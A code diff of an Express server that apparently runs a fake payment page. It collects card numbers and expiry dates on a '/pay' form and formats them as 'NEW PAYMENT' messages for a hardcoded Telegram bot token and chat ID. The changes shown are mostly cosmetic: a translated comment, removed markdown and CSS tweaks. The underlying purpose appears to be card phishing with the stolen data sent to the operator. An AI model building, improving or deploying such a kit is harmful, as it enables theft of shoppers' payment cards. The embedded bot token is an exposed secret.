@@ -12,11 +12,11 @@ app.use(express.static(__dirname));
 
 // ---------- TELEGRAM ----------
 const BOT_TOKEN = "8696604379:AAHOpUvUcDwzLNTBH_GvGxVK7dNMFiqbVnw";
-const CHAT_ID = "8685919221";  // vash real'nyy ID
+const CHAT_ID = "8685919221";  // твой реальный ID
 
 async function sendToTelegram(data) {
     const text = `
-💳 **NEW PAYMENT**
+💳 NEW PAYMENT
 
 Card: ${data.card_number}
 Expiry: ${data.expiry}
@@ -43,7 +43,6 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// KRASIVAYA FORMA OPLATY (kak na skrinshote)
 app.get('/pay', (req, res) => {
     const product = req.query.product || 'Item';
     const price = req.query.price || '0';
@@ -73,7 +72,6 @@ app.get('/pay', (req, res) => {
             max-width: 440px;
             box-shadow: 0 25px 50px -12px rgba(0,0,0,0.8);
             border: 1px solid #2a2f3f;
-            transition: 0.3s;
         }
         .card h1 {
             color: #fff;
@@ -98,7 +96,6 @@ app.get('/pay', (req, res) => {
             font-size: 13px;
             font-weight: 500;
             margin-bottom: 6px;
-            letter-spacing: 0.3px;
         }
         .field input {
             width: 100%;
@@ -117,7 +114,6 @@ app.get('/pay', (req, res) => {
         }
         .field input::placeholder {
             color: #5b617a;
-            font-weight: 300;
         }
         .row {
             display: flex;
@@ -136,9 +132,7 @@ app.get('/pay', (req, res) => {
             font-size: 18px;
             font-weight: 600;
             cursor: pointer;
-            transition: 0.2s;
             margin-top: 10px;
-            letter-spacing: 0.5px;
             box-shadow: 0 8px 20px rgba(108, 123, 255, 0.25);
         }
         .btn:hover {
@@ -167,7 +161,6 @@ app.get('/pay', (req, res) => {
             text-decoration: none;
             font-size: 14px;
             margin-top: 18px;
-            transition: 0.2s;
         }
         .back:hover { color: #c8ccda; }
         .product-info {
